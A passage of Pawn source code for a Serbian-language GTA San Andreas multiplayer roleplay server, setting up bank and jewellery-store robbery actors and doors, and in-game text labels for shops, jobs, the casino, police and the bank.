    ZlataraActors[0] = CreateDynamicActor(1+random(311), 1709.0891,1229.7063,992.4035,273.3679, 1, 100.0, 70, 70, -1, 30.0);
    ZlataraActors[1] = CreateDynamicActor(1+random(311), 1712.2523,1217.6155,993.2150,233.5742, 1, 100.0, 70, 70, -1, 30.0);
    ResetZlataraActors();

    //

    BankaOpljackana = gettime();
    PljackaUToku = false;

    BankTargets[0] = CreateDynamicActor(147, 1371.8757,-21.4224,1000.9133,357.8768, 1, 100.0, 96, 1, -1, 15.0, .priority = 1);
    BankTargets[1] = CreateDynamicActor(71, 1377.5735,-10.3509,1004.4440,162.1636, 1, 100.0, 96, 1, -1, 25.0, .priority = 1);
    BankTargets[2] = CreateDynamicActor(71, 1380.9954,-0.5991,1000.9153,216.3707, 1, 100.0, 96, 1, -1, 25.0, .priority = 1);

    BankActors[0] = CreateDynamicActor(171, 1375.2648,-31.2690,1000.9133,86.5042, 1, 100.0, 96, 1, -1, 25.0);
    BankActors[1] = CreateDynamicActor(172, 1375.2675,-29.5727,1000.9133,89.6375, 1, 100.0, 96, 1, -1, 25.0);
    ResetBankActors();

	BankDoor[0] = CreateDynamicObject(1495, 1374.373901, -18.635730, 1003.401123, 0.000000, 0.000000, 0.000000, 96, 1, -1, 300.00, 300.00);
	SetDynamicObjectMaterial(BankDoor[0], 0, 1560, "7_11_door", "CJ_CHROME2", 0xFFFFFFFF);
	SetDynamicObjectMaterial(BankDoor[0], 1, 10806, "airfence_sfse", "ws_griddyfence", 0x00000000);
	SetDynamicObjectMaterial(BankDoor[0], 2, 1560, "7_11_door", "CJ_CHROME2", 0xFFD3D3D3);
	BankDoorOpened[0] = false;

	BankDoor[1] = CreateDynamicObject(1495, 1376.654174, -9.294741, 1003.401123, 0.000000, -0.000007, 179.999954, 96, 1, -1, 300.00, 300.00);
	SetDynamicObjectMaterial(BankDoor[1], 0, 1560, "7_11_door", "CJ_CHROME2", 0xFFFFFFFF);
	SetDynamicObjectMaterial(BankDoor[1], 1, 10806, "airfence_sfse", "ws_griddyfence", 0x00000000);
	SetDynamicObjectMaterial(BankDoor[1], 2, 1560, "7_11_door", "CJ_CHROME2", 0xFFD3D3D3);
	BankDoor[2] = CreateDynamicObject(1495, 1373.653442, -9.325742, 1003.401123, 0.000000, 0.000007, 0.000000, 96, 1, -1, 300.00, 300.00);
	SetDynamicObjectMaterial(BankDoor[2], 0, 1560, "7_11_door", "CJ_CHROME2", 0xFFFFFFFF);
	SetDynamicObjectMaterial(BankDoor[2], 1, 10806, "airfence_sfse", "ws_griddyfence", 0x00000000);
	SetDynamicObjectMaterial(BankDoor[2], 2, 1560, "7_11_door", "CJ_CHROME2", 0xFFD3D3D3);
	BankDoorOpened[1] = false;

	BankDoor[3] = CreateDynamicObject(1495, 1385.467529, 0.895255, 999.899291, 0.000000, -0.000053, 179.999679, 96, 1, -1, 300.00, 300.00);
	SetDynamicObjectMaterial(BankDoor[3], 0, 1560, "7_11_door", "CJ_CHROME2", 0xFFFFFFFF);
	SetDynamicObjectMaterial(BankDoor[3], 1, 10806, "airfence_sfse", "ws_griddyfence", 0x00000000);
	SetDynamicObjectMaterial(BankDoor[3], 2, 1560, "7_11_door", "CJ_CHROME2", 0xFFD3D3D3);
	BankDoor[4] = CreateDynamicObject(1495, 1382.466796, 0.864254, 999.899291, 0.000000, 0.000053, 0.000000, 96, 1, -1, 300.00, 300.00);
	SetDynamicObjectMaterial(BankDoor[4], 0, 1560, "7_11_door", "CJ_CHROME2", 0xFFFFFFFF);
	SetDynamicObjectMaterial(BankDoor[4], 1, 10806, "airfence_sfse", "ws_griddyfence", 0x00000000);
	SetDynamicObjectMaterial(BankDoor[4], 2, 1560, "7_11_door", "CJ_CHROME2", 0xFFD3D3D3);
	BankDoorOpened[2] = false;
}

_:public CloseBankDoors()
{
	MoveDynamicObject(BankDoor[0], 1374.373901, -18.635730, 1003.401123, 1.0, 0.000000, 0.000000, 0.000000);
	MoveDynamicObject(BankDoor[1], 1376.654174, -9.294741, 1003.401123, 1.0, 0.000000, -0.000007, 179.999954);
	MoveDynamicObject(BankDoor[2], 1373.653442, -9.325742, 1003.401123, 1.0, 0.000000, 0.000007, 0.000000);
	MoveDynamicObject(BankDoor[3], 1385.467529, 0.895255, 999.899291, 1.0, 0.000000, -0.000053, 179.999679);
	MoveDynamicObject(BankDoor[4], 1382.466796, 0.864254, 999.899291, 1.0, 0.000000, 0.000053, 0.000000);
	for(new i; i < 3; i++) BankDoorOpened[i] = false;
	ResetBankActors();
	return 1;
}

_:public OpenBankDoor(door)
{
	switch(door)
	{
		case 1: MoveDynamicObject(BankDoor[0], 1374.373901 - 0.85, -18.635730, 1003.401123, 1.0, 0.000000, 0.000000, 0.000000), BankDoorOpened[0] = true;
		case 2:
		{
			MoveDynamicObject(BankDoor[1], 1376.654174 + 0.975, -9.294741, 1003.401123, 1.0, 0.000000, -0.000007, 179.999954), BankDoorOpened[1] = true;
			MoveDynamicObject(BankDoor[2], 1373.653442 - 0.975, -9.325742, 1003.401123, 1.0, 0.000000, 0.000007, 0.000000);
		}
		case 3:
		{
			MoveDynamicObject(BankDoor[3], 1385.467529 + 0.975, 0.895255, 999.899291, 1.0, 0.000000, -0.000053, 179.999679), BankDoorOpened[2] = true;
			MoveDynamicObject(BankDoor[4], 1382.466796 - 0.975, 0.864254, 999.899291, 1.0, 0.000000, 0.000053, 0.000000);
		}
	}
	return 1;
}

BankActorsHandsup()
{
	for(new i; i < 2; i++) ApplyDynamicActorAnimation(BankActors[i], "ped", "handsup", 4.1, 0, 1, 1, 1, 0);
}

ResetBankActors()
{
	ApplyDynamicActorAnimation(BankActors[0], "COP_AMBIENT", "Coplook_loop", 4.0, 1, 1, 1, 1, 0);
	ApplyDynamicActorAnimation(BankActors[1], "COP_AMBIENT", "Coplook_loop", 4.0, 1, 1, 1, 1, 0);
}

ZlataraActorsHandsup()
{
	for(new i; i < 2; i++) ApplyDynamicActorAnimation(ZlataraActors[i], "ped", "handsup", 4.1, 0, 1, 1, 1, 0);
}

_:public ResetZlataraActors()
{
	ApplyDynamicActorAnimation(ZlataraActors[0], "GRAFFITI", "graffiti_Chkout", 4.0, 1, 1, 1, 1, 0);
	ApplyDynamicActorAnimation(ZlataraActors[1], "BAR", "Barserve_bottle", 3.0, 1, 1, 1, 1, 0);
	return 1;
}
//------------------------------------------------------------------------------
public OnPlayerPickUpDynamicPickup(playerid, pickupid)
{
    for( new i = 0; i < MAX_JOBS; i++)
	{
        if( pickupid == jobsInfos[ i ][ jPickup ] )
		{
            ChosenJob[ playerid ] = i+1;
            break;
		}
	}
    return 1;
}
//------------------------------------------------------------------------------
_:public CreatePickupsAnd3Ds()
{
	// clothing system
    Create3DandP("(( ODECA ))\nDa kupite sesir ili kapu kucajte {FFFFFF}\"/buyhats\"", 205.0401, -100.3267, 1005.2578, -1, -1, 19067, 10.0);
    Create3DandP("(( ODECA ))\nDa kupite maramu za lice kucajte {FFFFFF}\"/buybandanas\"", 151.2055, -92.5647, 1001.8047, -1, -1, 18912, 10.0);
    Create3DandP("(( ODECA ))\nDa kupite maramu ili masku kucajte {FFFFFF}\"/buymasks\"", 171.4970, -92.8723, 1001.8047, -1, -1, 18891, 10.0);
    Create3DandP("(( ODECA ))\nDa kupite naocare kucajte {FFFFFF}\"/buyglasses\"", 209.8154, -33.7277, 1001.9297, -1, -1, 19138, 10.0);
    Create3DandP("(( ODECA ))\nDa kupite kacket kucajte {FFFFFF}\"/buycaps\"", 209.3052, -7.9960, 1005.2109, -1, -1, 18939, 10.0);
    Create3DandP("(( ODECA ))\nDa kupite novu odecu kucajte {FFFFFF}\"/kupiodecu\"", 206.3761, -8.1491, 1001.2109, -1, -1, 1275, 10.0);
    Create3DandP("(( ODECA ))\nDa kupite novu odecu kucajte {FFFFFF}\"/kupiodecu\"", 161.1792, -83.2523, 1001.8047, -1, -1, 1275, 10.0);
    Create3DandP("(( ODECA ))\nDa kupite novu odecu kucajte {FFFFFF}\"/kupiodecu\"", 208.0208, -100.3269, 1005.2578, -1, -1, 1275, 10.0);
    Create3DandP("(( ODECA ))\nDa kupite novu odecu kucajte {FFFFFF}\"/kupiodecu\"", 203.7806, -43.2623, 1001.8047, -1, -1, 1275, 10.0);
    Create3DandP("(( ODECA ))\nDa kupite novu odecu kucajte {FFFFFF}\"/kupiodecu\"", 1309.6923, -882.9189, 39.5781, -1, -1, 1275, 10.0);

	//kasino
	Create3DandP( "(( CASINO ))\nDa igrate rulet kucajte {FFFFFF}\"/rulet\"", -1995.8182,-766.4884,1497.4738, 3, -1, 1934, 10.0);
    Create3DandP( "(( CASINO ))\nDa igrate rulet kucajte {FFFFFF}\"/rulet\"", -1997.8105,-763.6893,1497.4738, 3, -1, 1934, 10.0);
    Create3DandP( "(( CASINO ))\nDa igrate rulet kucajte {FFFFFF}\"/rulet\"", -1989.2404,-766.6235,1497.4738, 3, -1, 1934, 10.0);
    Create3DandP( "(( CASINO ))\nDa igrate rulet kucajte {FFFFFF}\"/rulet\"", -1982.0557,-766.8058,1497.4738, 3, -1, 1934, 10.0);

	// kiosci
    Create3DandP( "(( KIOSK ))\nUkoliko zelite kupiti nesto kucajte {FFFFFF}\"/buyt\"", 1420.0414,-1722.5942,13.5469, -1, -1, (random(2) == 1 ? 19896 : 19897), 10.0);
	Create3DandP( "(( KIOSK ))\nUkoliko zelite kupiti nesto kucajte {FFFFFF}\"/buyt\"", 1513.5792,-2286.3040,13.5469, -1, -1, (random(2) == 1 ? 19896 : 19897), 10.0);
	Create3DandP( "(( KIOSK ))\nUkoliko zelite kupiti nesto kucajte {FFFFFF}\"/buyt\"", 1699.0959,-1311.4446,13.6361, -1, -1, (random(2) == 1 ? 19896 : 19897), 10.0);
	Create3DandP( "(( KIOSK ))\nUkoliko zelite kupiti nesto kucajte {FFFFFF}\"/buyt\"", 1536.0206,-1037.9900,23.8038, -1, -1, (random(2) == 1 ? 19896 : 19897), 10.0);
	Create3DandP( "(( KIOSK ))\nUkoliko zelite kupiti nesto kucajte {FFFFFF}\"/buyt\"", 1175.1951,-935.0350,43.0684, -1, -1, (random(2) == 1 ? 19896 : 19897), 10.0);
	Create3DandP( "(( KIOSK ))\nUkoliko zelite kupiti nesto kucajte {FFFFFF}\"/buyt\"", 1196.2822,-1274.7947,13.5469, -1, -1, (random(2) == 1 ? 19896 : 19897), 10.0);
	Create3DandP( "(( KIOSK ))\nUkoliko zelite kupiti nesto kucajte {FFFFFF}\"/buyt\"", 1191.6115,-1706.1720,13.5469, -1, -1, (random(2) == 1 ? 19896 : 19897), 10.0);
	Create3DandP( "(( KIOSK ))\nUkoliko zelite kupiti nesto kucajte {FFFFFF}\"/buyt\"", 338.9061,-1771.3350,5.1622, -1, -1, (random(2) == 1 ? 19896 : 19897), 10.0);
	Create3DandP( "(( KIOSK ))\nUkoliko zelite kupiti nesto kucajte {FFFFFF}\"/buyt\"", 2263.6519,-1308.8433,23.9844, -1, -1, (random(2) == 1 ? 19896 : 19897), 10.0);

	//kladionica
	Create3DandP( "(( KLADIONICA ))\nDa uplatite tiket kucajte {FFFFFF}\"/kladionica\"", 822.0087,1.8908,1004.1797, -1, -1, 2114, 10.0);

	//vip vehicle
	Create3DandP( "{4282C1}VIP - Vozilo\nDa spawnate VIP vozilo kucajte {FFFFFF}\"/vipveh\"\n\n\
					{4282C1}Promoter - Vozilo\nDa spawnate Promoter vozilo kucajte {FFFFFF}\"/promoterveh\" {4282C1}ili {FFFFFF}\"/pveh\"\n\n\
					{4282C1}YouTuber - Vozilo\nDa spawnate YT vozilo kucajte {FFFFFF}\"/ytveh\"", 873.9756, -1663.4427, 13.5469, -1, -1, 2485, 10.0);

	//kurve
	CreateDynamic3DTextLabel( "{D4B5FF}Kurva\n{FFFFFF}Denise\n\n{D4B5FF}Da krenete kucajte {FFFFFF}\"/blowjob\"", -1, -2436.4424, 995.2935, -20.5350, 3.0, IPI, IVI, 1, -1, -1 );
	CreateDynamic3DTextLabel( "{D4B5FF}Kurva\n{FFFFFF}Candy\n\n{D4B5FF}Da krenete kucajte {FFFFFF}\"/blowjob\"",-1, -2436.6335, 1006.5629, -20.5350, 3.0, IPI, IVI, 1, -1, -1 );
	CreateDynamic3DTextLabel( "{D4B5FF}Kurva\n{FFFFFF}Misty\n\n{D4B5FF}Da krenete kucajte {FFFFFF}\"/blowjob\"", -1, -2448.6267, 1006.4838, -20.5350, 3.0, IPI, IVI, 1, -1, -1 );
	CreateDynamic3DTextLabel( "{D4B5FF}Kurva\n{FFFFFF}Lola\n\n{D4B5FF}Da krenete kucajte {FFFFFF}\"/blowjob\"", -1, -2448.4248, 996.1221, -20.5350, 3.0, IPI, IVI, 1, -1, -1 );

	//xmas
	#if XMAS_MOD == 1

		CreateDynamic3DTextLabel("{3BD14C}Nova Godina - 2020\n{FFFFFF}Snesko belic vam daje vredne poklone!\n\n{3BD14C}Da pokupite vas poklon kucajte {FFFFFF}\"/novagodina\"", -1, 1504.5527, -1611.0928, 14.0469, 30.0, IPI, IVI, 1, -1, -1 );

	#endif

	// firme
    Create3DandP("(( HRANA ))\nDa kupite hranu kucajte {FFFFFF}\"/menu\"", 378.1259, -67.7236, 1001.5151, -1, -1, (random(2) == 1 ? 19847 : 19580), 10.0);
    Create3DandP("(( HRANA ))\nDa kupite hranu kucajte {FFFFFF}\"/menu\"", 369.4863, -6.0172, 1001.8589, -1, -1, (random(2) == 1 ? 19847 : 19580), 10.0);
    Create3DandP("(( HRANA ))\nDa kupite hranu kucajte {FFFFFF}\"/menu\"", 450.3892, -83.6542, 999.5547, -1, -1, (random(2) == 1 ? 19847 : 19580), 10.0);
    Create3DandP("(( HRANA ))\nDa kupite hranu kucajte {FFFFFF}\"/menu\"", -786.3990, 500.0740, 1371.7422, -1, -1, (random(2) == 1 ? 19847 : 19580), 10.0);
    Create3DandP("(( HRANA ))\nDa kupite hranu kucajte {FFFFFF}\"/menu\"", 375.6081, -118.8045, 1001.4995, -1, -1, (random(2) == 1 ? 19847 : 19580), 10.0);
    Create3DandP("(( PICE ))\nDa kupite pice kucajte {FFFFFF}\"/drink\"", -2656.1489, 1405.1801, 906.2734, -1, -1, 1486, 10.0);
    Create3DandP("(( PICE ))\nDa kupite pice kucajte {FFFFFF}\"/drink\"", -2662.1855, 1405.1818, 906.2734, -1, -1, 1486, 10.0);
    Create3DandP("(( PICE ))\nDa kupite pice kucajte {FFFFFF}\"/drink\"", -2662.1685, 1415.4471, 906.2734, -1, -1, 1486, 10.0);
    Create3DandP("(( PICE ))\nDa kupite pice kucajte {FFFFFF}\"/drink\"", -2656.0698, 1415.4480, 906.2734, -1, -1, 1486, 10.0);
    Create3DandP("(( PICE ))\nDa kupite pice kucajte {FFFFFF}\"/drink\"", 499.9696, -20.6968, 1000.6797, -1, -1, 1486, 10.0);
    Create3DandP("(( PICE ))\nDa kupite pice kucajte {FFFFFF}\"/drink\"", -2394.6497, 1000.6146, -20.5350, -1, -1, 1486, 10.0);
    Create3DandP("(( PICE ))\nDa kupite pice kucajte {FFFFFF}\"/drink\"", -2400.5559, 1006.5995, -20.5350, -1, -1, 1486, 10.0);
    Create3DandP("(( PICE ))\nDa kupite pice kucajte {FFFFFF}\"/drink\"", -2406.7527,1000.5036,-20.5350, -1, -1, 1486, 10.0);
    Create3DandP("(( PICE ))\nDa kupite pice kucajte {FFFFFF}\"/drink\"", -2400.6563, 994.4063, -20.5350, -1, -1, 1486, 10.0);
	Create3DandP("(( TERETANA ))\nDa naucite borbeni stil kucajte {FFFFFF}\"/treniraj\"", 771.0096,13.4834,1000.6988, -1, -1, 3071, 10.0);
    Create3DandP("(( GUN SHOP ))\nDa kupite oruzje kucajte {FFFFFF}\"/kupioruzje\"", 308.2903,-141.4637,999.6016, -1, -1, 348, 10.0);

	// 24/7 system
	Create3DandP("{4281C1}(( MARKET ))\n\nDa kupite stvari iz korpe kucajte {FFFFFF}\"/buy\"\n{4281C1}Da izbacite stvari iz korpe kucajte {FFFFFF}\"/izbaci\"", -28.0849,-89.9528,1003.5469, -1, -1, 19592, 10.0);
	Create3DandP("Pizza - 100$", -14.8936,-85.8825,1003.5469, -1, -1, 19580, 10.0);
	Create3DandP("Uze - 200$", -19.8782,-81.7753,1003.5469, -1, -1, 19087, 10.0);
	Create3DandP("Maska - 800$", -19.8783,-77.0707,1003.5542, -1, -1, 19036, 10.0);
	Create3DandP("Sok - 40$", -25.0427,-74.3232,1003.5469, -1, -1, 1546, 10.0);
	Create3DandP("Pivo - 55$", -17.9551,-74.3143,1003.5542, -1, -1, 1950, 10.0);
	Create3DandP("Hamburger - 65$", -31.8768,-77.5130,1003.5469, -1, -1, 2880, 10.0);
	Create3DandP("Riba - 250$", -17.2291,-81.3823,1003.5469, -1, -1, 19630, 10.0);
    Create3DandP("Cigare - 35$", -37.3030,-76.5274,1003.5469, -1, -1, (random(2) == 1 ? 19896 : 19897), 10.0);
    Create3DandP("Upaljac - 25$", -34.9580,-74.3164,1003.5469, -1, -1, 19998, 10.0);
	Create3DandP("Vatromet - 3500$", -37.3904,-85.7628,1003.5469, -1, -1, 19179, 10.0);

	// salon
	Create3DandP("{36AB00}(( SALON VOZILA ))\nDa kupite vozilo kucajte {FFFFFF}\"/kupivozilo\"", 543.1198,-1293.8124,17.2910, 0, 0, 2485, 10.0);

	// Poslovi
	new string_1[110];
    for(new i = 0; i < MAX_JOBS; i++)
	{
        if( jobsInfos[ i ][ jTakeJobPos ][ 0 ] != 0 )
		{
            jobsInfos[ i ][ jPickup ] = CreateDynamicPickup( 19606, 1, jobsInfos[ i ][ jTakeJobPos ][ 0 ], jobsInfos[ i ][  jTakeJobPos ][ 1 ], jobsInfos[ i ][ jTakeJobPos ][ 2 ], -1, -1 );
			format( string_1, sizeof( string_1 ), "{36AB00}Posao\n{FFFFFF}%s\n\n{36AB00}Da uzmete posao kucajte {FFFFFF}\"/takejob\"", stringtoUpperCase( jobsInfos[ i ][ jName ] ) );
            CreateDynamic3DTextLabel( string_1, -1, jobsInfos[ i ][ jTakeJobPos ][ 0 ], jobsInfos[ i ][  jTakeJobPos ][ 1 ], jobsInfos[ i ][ jTakeJobPos ][ 2 ], 10.0, IPI, IVI, 0, -1, -1 );
            CreateDynamicMapIcon(jobsInfos[ i ][ jTakeJobPos ][ 0 ], jobsInfos[ i ][  jTakeJobPos ][ 1 ], jobsInfos[ i ][ jTakeJobPos ][ 2 ], 11, -1, -1, -1, -1, 1000.0);
		}
        if( jobsInfos[ i ][ jUniformPos ][ 0 ] != 0 )
		{
		    format(string_1, sizeof(string_1), "{36AB00}Uniforma\n{FFFFFF}%s\n\n{36AB00}Da koristite opremu kucajte {FFFFFF}\"/uniforma\"", stringtoUpperCase( jobsInfos[ i ][ jName ] ));
			Create3DandP( string_1,  jobsInfos[ i ][ jUniformPos ][ 0 ], jobsInfos[ i ][  jUniformPos ][ 1 ], jobsInfos[ i ][ jUniformPos ][ 2 ], -1, -1, 19904, 10.0);
		}
	}

	Create3DandP("{36AB00}(( MEHANICAR ))\nPonudjene opcije kucajte {FFFFFF}\"/mehanicar\"", 1817.6010,-1419.5872,15.8312, -1, -1, 19627, 10.0);
    Create3DandP("{36AB00}(( MEHANICAR ))\nDa ugradite neonke na auto kucajte {FFFFFF}\"/ugradineon\"", 1817.1223,-1404.1307,15.8400, -1, -1, 19627, 20.0 );
    Create3DandP("{36AB00}(( MEHANICAR ))\nDa ugradite neonke na auto kucajte {FFFFFF}\"/mehanicar tuning\"", 1817.0668,-1411.8229,15.1240, -1, -1, 19627, 20.0 );
    Create3DandP("{36AB00}(( MEHANICAR ))\nDa pokrenete dostavljanje vozila kucajte {FFFFFF}\"/mechanic job\"", 1833.9697,-1427.4281,13.6016, -1, -1, 19627, 20.0 );

	Create3DandP("{36AB00}(( PILOT ))\nDa popravite avion(500$) kucajte {FFFFFF}\"/popraviavion\"", 1865.6421, -2390.7712, 14.4759, -1, -1, 2510, 20.0 );
	Create3DandP("{36AB00}(( PILOT ))\nDa popravite avion(500$) kucajte {FFFFFF}\"/popraviavion\"", -1525.4755, -81.9020, 15.0702, -1, -1, 2510, 20.0 );
	Create3DandP("{36AB00}(( PILOT ))\nDa popravite avion(500$) kucajte {FFFFFF}\"/popraviavion\"", 1433.4257, 1379.8014, 11.7424, -1, -1, 2510, 20.0 );
    Create3DandP("{36AB00}(( PILOT ))\nDa pokrenete prevoz putnika kucajte {FFFFFF}\"/posao\"", 1926.1537, -2399.1230, 13.5469, -1, -1, 2510, 100.0 );

    Create3DandP("{36AB00}(( PREVOZNIK NOVCA ))\nDa pokrenete prevoz novca kucajte {FFFFFF}\"/posao\"", 1533.7557, -1014.7694, 24.2872, -1, -1, 1550, 20.0 );

    Create3DandP("{36AB00}(( UBER ))\nDa pokrenete prevoz putnika kucajte {FFFFFF}\"/posao\"", 1778.0533, -1904.6150, 13.3879, -1, -1, 1239, 20.0);

    Create3DandP("{36AB00}(( PROIZVODJAC NAMJESTAJA ))\nDa pokrenete proizvodnju namjestaja kucajte {FFFFFF}\"/posao\"", -2149.7056, 2779.1912, 13.3109, -1, -1, 11733, 20.0);

    Create3DandP("{36AB00}(( PROIZVODJAC MUNICIJE ))\nDa pokrenete proizvodnju municije kucajte {FFFFFF}\"/posao\"", -10.9390,-275.7184,1529.5376, -1, -1, 2061, 100.0 );

	//opstina
    Create3DandP("(( OPSTINA ))\nDa pogledate poslove kucajte {FFFFFF}\"/poslovi\"", -1847.6321, 2656.1096, 3.6158, -1, -1, 1239, 10.0);
	Create3DandP("(( OPSTINA ))\nDa kupite fakture za firmu kucajte {FFFFFF}\"/kupifakture\"", -1873.1703, 2665.5222, 3.5894, -1, -1, 1239, 10.0);
    Create3DandP("(( OPSTINA ))\nDa skinete org kaznu kucajte {FFFFFF}\"/skiniorgkaznu\"", -1873.1704, 2670.5789, 3.5904, -1, -1, 1239, 10.0);
    Create3DandP("(( OPSTINA ))\nDa overite papire za registraciju kucajte {FFFFFF}\"/v(ozilo) > 'Registruj'\"", -1873.1699, 2675.4045, 3.5904, -1, -1, 1239, 10.0 );

	//russian mafia
    Create3DandP("{FF5500}Lift\n{FFFFFF}Russian Mafia\nDa koristite lift pritisnite {FFFFFF}\"ENTER\"", 64.8168,-1737.4658,3.2231, -1, -1, 19135, 10.0);
    Create3DandP("{FF5500}Lift\n{FFFFFF}Russian Mafia\nDa koristite lift pritisnite {FFFFFF}\"ENTER\"", 55.3508,-1740.7244,25.7431, -1, -1, 19135, 10.0);

    //lspd
    Create3DandP("{FF5500}Lift\n{FFFFFF}Los Santos Police Department\nDa koristite lift pritisnite {FFFFFF}\"ENTER\"", 1359.5334, 1064.9695, 1626.4896, -1, -1, 19135, 10.0);
    Create3DandP("{FF5500}Lift\n{FFFFFF}Los Santos Police Department\nDa koristite lift pritisnite {FFFFFF}\"ENTER\"", 1576.8925, -1694.2762, 6.2188, -1, -1, 19135, 10.0);

	//hangar
    new str_hang[100];
	format( str_hang, sizeof( str_hang ), "(HANGAR[ORUZJE] - [%d/10])\nDa uzmete paket kucajte \"/uzmipaket\"", ServerInfo[ HangarPaket ] );
    ServerInfo[ SHangarLabel ] = CreateDynamic3DTextLabel( str_hang, -1, 2410.2866,-2493.5195,13.6401, 20.0, IPI, IVI, 1, -1, -1 );
	format( str_hang, sizeof( str_hang ), "(HANGAR[DROGA] - [%d/500g])\nDa uzmete paket kucajte \"/uzmidrogu\"", ServerInfo[ SkladisteDroga ] );
    ServerInfo[ SDrogaLabel ] = CreateDynamic3DTextLabel( str_hang, -1, 2411.4688,-2490.3281,13.6389, 10.0, IPI, IVI, 1, -1, -1 );

	//banka
	Create3DandP("{4281C1}(( BANKA ))\n{FFFFFF}\"ENTER\" {4281C1}za ulaz.", 1456.7057,-1010.1188,26.8438, -1, -1, 19133, 15.0);
	Create3DandP("{4281C1}(( BANKA ))\n{FFFFFF}\"ENTER\" {4281C1}za ulaz.", 1467.7717,-1010.1223,26.8438, -1, -1, 19133, 15.0);
	Create3DandP("{4281C1}(( BANKA ))\n{FFFFFF}\"ENTER\" {4281C1}za izlaz.", 1373.8276,-38.1484,1000.9133, 1, 96, 19133, 15.0);
	Create3DandP("{4281C1}(( BANKA ))\n{FFFFFF}\"ENTER\" {4281C1}za izlaz.", 1370.7448,-38.1494,1000.9133,1, 96, 19133, 15.0);
   	Create3DandP("(( BANKA ))\nDa provjerite racun kucajte {FFFFFF}\"/balance\"", 1381.7212,-23.2731,1004.4440, 1, 96, 1239, 7.0);
	Create3DandP("(( BANKA ))\nDa podignete novac kucajte {FFFFFF}\"/withdraw\"", 1381.7136,-25.5145,1004.4440, 1, 96, 1239, 7.0);
	Create3DandP("(( BANKA ))\nDa polozite novac kucajte {FFFFFF}\"/deposit\"", 1381.7097,-27.8027,1004.4440, 1, 96, 1239, 7.0);
	Create3DandP("(( BANKA ))\nDa prebacite novac kucajte {FFFFFF}\"/transfer\"", 1381.7151,-30.1245,1004.4440, 1, 96, 1239, 7.0);
	Create3DandP("(( BANKA ))\nDa podignete kredit kucajte {FFFFFF}\"/podignikredit\"", 1381.7201,-32.4292,1004.4440, 1, 96, 1239, 7.0);
	Create3DandP("(( BANKA ))\nDa vratite kredit kucajte {FFFFFF}\"/kredit\"", 1381.7206,-34.7188,1004.4449, 1, 96, 1239, 7.0);
	Create3DandP("(( BANKA ))\nDa pljackate banku kucajte {FFFFFF}\"/pljackajbanku\"", 1389.9515,1.2408,1000.9153, 1, 96, 1239, 3.0);
	CreateDynamic3DTextLabel("Central Bank - Staff\nUkoliko trebate pomoc upisite\nna 'T' > 'pomoc'", -1, 1373.8710,-30.3978,1000.9133, 7.0, .worldid = 96, .interiorid = 1, .streamdistance = 7.0);

	//zlatara
	Create3DandP("(( ZLATARA ))\nDa kupite sat kucajte {FFFFFF}\"/kupisat\"", 1707.7828,1207.8645,993.2150, 70, 70, 2710, 10.0);
    Create3DandP("(( ZLATARA ))\nDa prodate zlato kucajte {FFFFFF}\"/prodajzlato\"\n\n{4282C1}(( DIJAMANT STORE ))\nDa prodate dijamente kucajte {FFFFFF}\"/prodajdijamante\"", 1707.7828,1206.3898,993.2150, 70, 70, 19941, 10.0 );
    CreateDynamic3DTextLabel( "(( ZLATARA ))\nDa opljackate zlataru kucajte {FFFFFF}\"/pljackajzlataru\"", 0x4281C1AA, 1736.8824,1203.5746,993.2150, 7.0, IPI, IVI, 70, 70, -1 );

	//pd
    Create3DandP("(( POLICE ))\nDa kupite dozvolu za oruzje kucajte {FFFFFF}\"/buygunlic\"", 1359.1907,1070.0505,1626.4896, 6, -1, 1581, 10.0);
    Create3DandP("(( POLICE ))\nDa uzmete tablice kucajte {FFFFFF}\"/v(ozilo) > 'Uzmi Tablice'\"", 1359.1913,1067.7510,1626.4896, 6, -1, 2684, 10.0);
	Create3DandP("(( POLICE ))\nDa upalite racunar kucajte {FFFFFF}\"/computer\"", 1372.4180,1088.8485,1626.4896, 6, -1, 19894, 10.0);
    Create3DandP("(( POLICE ))\nUkoliko zelite popraviti vozilo kucajte {FFFFFF}\"/govrepair\"", 1579.7245, -1632.3541, 13.3828, 0, 0, 19627, 10.0);
    CreateDynamicPickup(1239, 1, 1558.0685,-1675.5160,28.3955, -1, -1, -1);
    CreateDynamicPickup(1239, 1, 1359.5321,1064.9854,1626.4896, -1, 6, -1);
    CreateDynamicPickup(1239, 1, 1533.1113, -1736.2327, -64.0829, -1, -1, -1);
    CreateDynamicPickup(1239, 1, 1524.4833, -1677.7874, 6.2188, -1, -1, -1);

	//sd
    Create3DandP("(( SHERIFF ))\nDa kupite dozvolu za oruzje kucajte {FFFFFF}\"/buygunlic\"", -8.2553,-3.0928,2005.4120, 6, -1, 1581, 10.0);
    Create3DandP("(( SHERIFF ))\nDa uzmete tablice kucajte {FFFFFF}\"/v(ozilo) > 'Uzmi Tablice'\"", -8.1004,10.1807,2005.4124, 6, -1, 2684, 10.0);
	Create3DandP("(( SHERIFF ))\nDa upalite racunar kucajte {FFFFFF}\"/computer\"", -24.1600,16.4334,2005.4120, 6, -1, 19894, 10.0);
	Create3DandP("(( SHERIFF ))\nUkoliko zelite popraviti vozilo kucajte {FFFFFF}\"/govrepair\"", 618.3335, -583.5156, 17.2178, 0, 0, 19627, 10.0);

    //zatvor
	Create3DandP("(( ZATVOR ))\nDa uhapsite osumnjicenog kucajte {FFFFFF}\"/arrest\"", 1824.3632, -1538.1356, 13.5469, -1, -1, 1247, 15.0 );
	Create3DandP("(( SHERIFF ))\nDa uhapsite osumnjicenog kucajte {FFFFFF}\"/arrest\"", 637.4807,-571.7715,16.1875, -1, -1, 1247, 15.0 );
	Create3DandP("(( POLICE ))\nDa uhapsite osumnjicenog kucajte {FFFFFF}\"/arrest\"", 1536.1509,-1672.9240,13.1989, -1, -1, 1247, 15.0 );

	// Ostalo
    Create3DandP("(( OGLASI ))\nDa postavite oglas kucajte {FFFFFF}\"/ad\"", 1691.0156, -1343.3184, 17.4276, -1, -1, 19513, 10.0);

	Create3DandP("{FF0000}(( BINGO ))\n\nDa uplatite bingo listic kucajte {FFFFFF}\"/uplatibingo\"\n{FF0000}Da podigne bingo dobitak kucajte {FFFFFF}\"/podignidobitak\"", 1283.1431, -1542.3771, 13.5187, -1, -1, 3101, 10.0 );

	Create3DandP("(( AUTOSKOLA ))\nDa polazete testove kucajte {FFFFFF}\"/buylic\"", -233.7795, 2788.5210, -26.2710, -1, -1, 2684, 10.0 );

	Create3DandP("(( ELECTRONIC SHOP ))\nDa kupite telefon kucajte {FFFFFF}\"/buymobile\"", 1019.4869, 2663.4575, -46.5000, -1, -1, 18874, 10.0);
